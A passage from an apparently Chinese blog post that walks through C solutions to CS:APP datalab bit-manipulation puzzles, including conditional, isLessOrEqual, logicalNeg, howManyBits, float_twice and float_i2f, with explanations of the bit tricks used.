\overline{X}{Z}<br>$$<br>X=1，则RESULT=Y， X=0，RESULT = Z。</p><p>但是这只是在1bit的情况下，要换算到Integer（32bit）范围内，X要么等于0xff ff ff ff, 要么等于0x0.</p><p><strong>问题转化为:</strong></p><p><strong>如果x = 0，则不做转化。</strong></p><p><strong>如果x= 非0， 则x要转换为0xff ff ff ff。</strong></p><p>这里又要用到 **!!**运算了。</p><p><strong>又观察到,</strong>  </p><p><strong>0 -1 = 0xff ff ff ff</strong></p><p><strong>1 -0 = 0</strong></p><p>所以可写代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// x 为0 flag= 0 , x不为0,flag = 1</span></span><br><span class="line">    <span class="keyword">int</span> flag = !!x;              <span class="comment">// flag =1 or flag = 0</span></span><br><span class="line">    <span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">return</span> (~(flag + negative_one) &amp; y) | ((flag + negative_one) &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8. isLessOrEqual"></a>8. isLessOrEqual</h2><p>题目：</p><ul><li>目标：如果 x&lt;=y ，则返回1， 否则返回0.</li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：24</li><li>难度：3</li></ul><p>解法：</p><p>这道题目和前文的 <code>isAsciiDigit</code> 很相似，用的方法也是类似的，所以不赘述。</p><p>个人只是将运算按照 ”一、二、三、四象限“分成了四种情况考虑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negative_y = ~y + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 取出符号位</span></span><br><span class="line">    <span class="keyword">int</span> sx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> sy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x&gt;y ==&gt; x-y 的符号位一定是0</span></span><br><span class="line">    <span class="keyword">int</span> x_less_equal_than_y = (((x + negative_y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>) | !(x + negative_y);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x &lt; 0, y&gt;= 0 sx = 1 sy = 0, x &lt; y</span></span><br><span class="line">    <span class="keyword">int</span> result1 = sx &amp; (!sy);</span><br><span class="line">    <span class="comment">// x &lt; 0 , y &lt; 0 sx = 1, sy = 1, 且 x &lt;= y</span></span><br><span class="line">    <span class="keyword">int</span> result2 = sx &amp; sy &amp; x_less_equal_than_y;</span><br><span class="line">    <span class="comment">// x &gt;=0 , y &gt;= 0, sx =0 , sy = 0, 且 x &lt;= y</span></span><br><span class="line">    <span class="keyword">int</span> result3 = (!sx) &amp; (!sy) &amp; x_less_equal_than_y;</span><br><span class="line">    <span class="comment">// x &gt;=0 , y &lt; 0 , sx = 0, sy = 1, 这里 x &gt; y 需要求反,并且不再其它condition中</span></span><br><span class="line">    <span class="keyword">int</span> result4 = (!sx) &amp; sy;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result1 | result2 | result3 | ((!result4) &amp; result1 &amp; result2 &amp; result3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9. logicalNeg"></a>9. logicalNeg</h2><p>题目：</p><ul><li>目标：实现 ! 操作</li><li>例子： logicalNeg(3) = 0, logicalNeg(0) = 1</li><li>限制：只能使用操作符  ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：12</li><li>难度：4</li></ul><p>解法：</p><p>这里我的出发点是 0和其它数值有什么不同？</p><p>0的相反数是0. （注意Tmin的相反数也是Tmin）</p><p>所以设：</p><p>y = -x （前文有说-x的bit运算方式）</p><p>如果y的首位是0，则说明，x为0或Tmin。 既然0要映射为1，只要 y&gt;&gt;31 +1即可。</p><p>如果y的首位是1，则说明，x为非零非Tmin的数，这些值要映射为0，同样y&gt;&gt;31 +1 即可（注意是算数右移，所以y&gt;&gt;31 = 0xff ff ff ff)</p><p>现在，剩下的问题为如果区分0 和 Tmin。这个就很简单了。0的符号位为0，Tmin的符号位为1，再运用一次 x&gt;&gt;31+1即可。</p><p>所以，代码为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negative_x = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> result1 = ((x ^ negative_x) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>; <span class="comment">// 相反数判定</span></span><br><span class="line">    <span class="keyword">int</span> result2 = (x &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;<span class="comment">// 排除Tmin</span></span><br><span class="line">    <span class="keyword">return</span> result1 &amp; result2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10. howManyBits"></a>10. howManyBits</h2><p>题目：</p><ul><li>目标： 返回表示一个数（补码形式）所需要的最小bit数。</li><li>例子： <ul><li>howManyBits(12) = 5</li><li>howManyBits(298) = 10</li><li>howManyBits(-5) = 4</li><li>howManyBits(0)  = 1</li><li>howManyBits(-1) = 1</li><li>howManyBits(0x80000000) = 32</li></ul></li><li>限制：只能使用操作符 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 90</li><li>难度：4</li></ul><p>解法：</p><p>这道题难度非常大。我认为是datalab中最难的一道题。如果能使用if，loop就比较简单，但是难就难在不能使用这些运算。</p><p>所以先说一下思路：</p><p>首先从正数出发，如果从最高位到最低位扫描，当你找到首个1时，此时的1所在bit位+1（加1是因为还要个符号位），即是所需要的符号位数量。当然了0是例外。</p><p>问题再稍作转化，<strong>首次扫描到两个相邻的bit位分别是0和1时，就算是找到了所需要的符号位数量。</strong></p><p>再考虑一下负数，思考一下前面的黑体字，”扫描到两个bit位时0和1时，就算找到了“，那把负数的情况是不是就是 <strong>”首次扫描到两个bit位分别为1和0时呢？“</strong> （当然，-1除外）。</p><p>结合正负数，问题变为 <strong>从高位向低位扫描，首次扫描到两个相邻bit位值不同时，就算是找到了所需要的符号位数量</strong>，不过0和-1是特殊值。</p><p>前面说了这么多，其实并不是最终解法，前面说的目的为，<strong>“对于负数，我们可以用对待正数的相同的算法去处理”</strong>，即把负数翻转为正数即可（注意不是取相反数）。</p><p>先看下面代码：</p><p>关键代码1:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 x&lt; 0, 则翻转x</span></span><br><span class="line"><span class="keyword">int</span> reverse_x = ~x;</span><br><span class="line"><span class="comment">// 使用前面的conditional 来做, 三目运算符</span></span><br><span class="line"><span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">int</span> flag = !(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">x = (~(flag + negative_one) &amp; x) | ((flag + negative_one) &amp; reverse_x);</span><br></pre></td></tr></table></figure><p>到这里x一定是正数了。</p><p>现在就可以统一处理正负数了。问题是我们仍然无法通过if loop计算需要多少位bit来表示一个数。</p><p>为了更好的说明下面的算法，这里先贴一张图，以5bit数字进行说明：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200619232328439.png" alt="image-20200619232328439"></p><p>现在的关键是如何得到这个 <strong>剩余3bit信息：</strong></p><p>如果可以将当扫描位后的所有位置为1，我们就可以<strong>将问题转化为统计 当前数字的二进制表示 有多少个1了。</strong>（为什么要这么想，因为有<strong>bitcount算法</strong>啊）</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200619232535359.png" alt="image-20200619232535359"></p><p>关键代码2：</p><p>对于32位的数据，可以有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把最高位1后的所有位全部填充为 1</span></span><br><span class="line">x = x | x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">16</span>;</span><br></pre></td></tr></table></figure><p>接下来就是bitcount算法：</p><p>问题已转化为统计二进制中有多个1了。</p><p>先以4bit的数字为例：如何统计 <strong>0 1 0 1</strong>的1的个数？</p><p>我们可以通过掩码+移位的方式获取：</p><p>0 1 0 1 &amp; 1 = 1</p><p>(0 1 0 1 &gt;&gt; 1) &amp; 1 = 0</p><p>(0 1 0 1 &gt;&gt; 2) &amp; 1 = 1</p><p>(0 1 0 1 &gt;&gt; 3) &amp; 1 = 0</p><p>最后 1 + 0 + 1 + 0 = 2。</p><p>转化为代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">5</span>; <span class="comment">//(0 1 0 1)</span></span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br></pre></td></tr></table></figure><p>ok，上面是4bit的情况，如何计算32位呢。 我们当然可以写32次 += 操作来做。但是有更聪明的做法，运用分治的思想，将一个32bit的数，分成4个8bit的段。对每个段，运用上面的算法运算即可。</p><p>具体需要个人分析一下代码了，代码很短，所以也很好想清楚。</p><p>具体代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计算现在1的个数 分治算法 将整个二进制bit分成4段,每段8bit</span></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>;         <span class="comment">// 0001</span></span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>; <span class="comment">// 0000 0001 后文同理</span></span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">4</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">5</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">6</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">7</span>) &amp; mask;</span><br><span class="line"></span><br><span class="line">sum =  (sum &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br></pre></td></tr></table></figure><p>ok,现在的sum就是 32bit的二进制中的1的个数了。</p><p>结合上面所有算法，可得最终的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 如果 x&lt; 0, 则翻转x</span></span><br><span class="line">    <span class="keyword">int</span> reverse_x = ~x;</span><br><span class="line">    <span class="comment">// 使用前面的conditional 来做</span></span><br><span class="line">    <span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">int</span> flag = !(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">    x = (~(flag + negative_one) &amp; x) | ((flag + negative_one) &amp; reverse_x);</span><br><span class="line">    <span class="comment">// 把最高位1后的所有位全部填充为 1</span></span><br><span class="line">    x = x | x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="comment">// 计算现在1的个数 分治算法 将整个二进制bit分成8段,每段4bit</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">1</span>;         <span class="comment">// 0001</span></span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>; <span class="comment">// 0000 0001 后文同理</span></span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    sum += x &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">4</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">5</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">6</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">7</span>) &amp; mask;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分段计算0的个数</span></span><br><span class="line">    <span class="keyword">return</span> (sum &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) + <span class="number">1</span>; <span class="comment">// 符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-float-twice"><a href="#11-float-twice" class="headerlink" title="11. float_twice"></a>11. float_twice</h2><p>题目：</p><ul><li>目标： 给定一个浮点数f，返回2*f的二进制表示（单精度float point）。如果为Nan，直接返回参数。</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>其实能用if loop后，问题都变得比较简单。只用按照float的IEEE定义与实现取做就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取exp</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">exp</span> = (uf &amp; <span class="number">0x7fffffff</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Nan</span></span><br><span class="line">    <span class="keyword">unsigned</span> Nan = <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == Nan) &#123;</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exp == 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 除符号位外,left shift即可</span></span><br><span class="line">        <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">        uf = uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        uf = sign ? (uf | <span class="number">0x80000000</span>) : (uf &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// here , exp != 0</span></span><br><span class="line">    <span class="comment">// exp + 1即可</span></span><br><span class="line">    <span class="built_in">exp</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) &#123;</span><br><span class="line">        <span class="comment">// 变为无穷大</span></span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | <span class="number">0x7f800000</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x807fffff</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-float-i2f"><a href="#12-float-i2f" class="headerlink" title="12. float_i2f"></a>12. float_i2f</h2><p>题目：</p><ul><li>目标： 给定一个int类型的x，返回(float)x的二进制表示。</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>本题依然不算难，唯一需要注意的是，int转为float是有精度损失的。因为int是32bit，但是float的小数m只有23bit，在转化时，需要做舍入操作，舍入采用的是就近偶数（ nearest even）原则。</p><p><strong>我的解法超过了max ops了，并不是最优解</strong></p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 0是特殊情况,本应该采用denormalized方式表达接近0的数,但是这里只有0这个数需要采用denormalized</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tmin 特殊 因为 -tmin = tmin ,二进制情况</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0x80000000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xcf000000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录符号位</span></span><br><span class="line">    <span class="keyword">int</span> sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">1</span>)</span><br><span class="line">        x = -x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> bias = <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 找到最高有效位</span></span><br><span class="line">    <span class="keyword">int</span> highest_one_offset = <span class="number">30</span>;                 <span class="comment">// 略过符号位</span></span><br><span class="line">    <span class="keyword">while</span> (((x &gt;&gt; highest_one_offset) &amp; <span class="number">1</span>) != <span class="number">1</span>) <span class="comment">// 因为x!=0, 所有在遍历过程中一定会遇到1</span></span><br><span class="line">        highest_one_offset--;</span><br><span class="line">    <span class="built_in">exp</span> = bias + highest_one_offset;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  构造截断mask,截出所有小数位</span></span><br><span class="line">    <span class="keyword">int</span> trunc_frac_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; highest_one_offset - <span class="number">1</span>; i++)</span><br><span class="line">        trunc_frac_mask = (trunc_frac_mask &lt;&lt; <span class="number">1</span>) | <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最低有效位1的便宜量</span></span><br><span class="line">    <span class="keyword">int</span> lowest_one_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (((x &gt;&gt; lowest_one_offset) &amp; <span class="number">1</span>) != <span class="number">1</span>) <span class="comment">// 去掉所有末尾的0</span></span><br><span class="line">        lowest_one_offset++;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果截断长度大于了23位,考虑舍入问题</span></span><br><span class="line">    <span class="keyword">int</span> frac_len = highest_one_offset - lowest_one_offset;</span><br><span class="line">    <span class="keyword">if</span> (frac_len &lt;= <span class="number">23</span>) &#123;</span><br><span class="line">        <span class="comment">// 不用舍入</span></span><br><span class="line">        m = (x &amp; trunc_frac_mask) &gt;&gt; lowest_one_offset;</span><br><span class="line">        <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span> | m &lt;&lt; (<span class="number">23</span> - highest_one_offset + lowest_one_offset);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 需要舍入,(nearest even)</span></span><br><span class="line">        <span class="keyword">int</span> temp_frac = (x &amp; trunc_frac_mask) &gt;&gt; lowest_one_offset;</span><br><span class="line">        <span class="comment">// 检验有效位后的第一位</span></span><br><span class="line">        <span class="keyword">if</span> ((temp_frac &gt;&gt; (frac_len - <span class="number">23</span> - <span class="number">1</span>) &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 情况1:如果为0,说明将要舍入的部分 未达到小数范围一半直接舍入即可</span></span><br><span class="line">            m = temp_frac &gt;&gt; (frac_len - <span class="number">23</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 情况2:如果为1, 检验是否后面的舍入位是否为全0</span></span><br><span class="line">            <span class="keyword">int</span> offset_r = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((offset_r &lt; (frac_len - <span class="number">23</span> - <span class="number">1</span>)) &amp;&amp; (temp_frac &gt;&gt; (offset_r) &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">                offset_r++;</span><br><span class="line">            <span class="keyword">if</span> (offset_r &lt; frac_len - <span class="number">23</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果后面的舍入位不全为0,则直接向上舍入</span></span><br><span class="line">                m = (temp_frac &gt;&gt; (frac_len - <span class="number">23</span>)) + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//  如果后面的舍入位(包含leading位)刚好为一般,及 ?.1000000这种形式,需要考虑偶数舍入</span></span><br><span class="line">                <span class="keyword">if</span> ((temp_frac &gt;&gt; (frac_len - <span class="number">23</span>) &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//情况3, 向下舍</span></span><br><span class="line">                    m = temp_frac &gt;&gt; (frac_len - <span class="number">23</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 情况4,向上舍</span></span><br><span class="line">                    m = (temp_frac &gt;&gt; (frac_len - <span class="number">23</span>)) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-float-f2i"><a href="#13-float-f2i" class="headerlink" title="13. float_f2i"></a>13. float_f2i</h2><p>题目：</p><ul><li>目标： 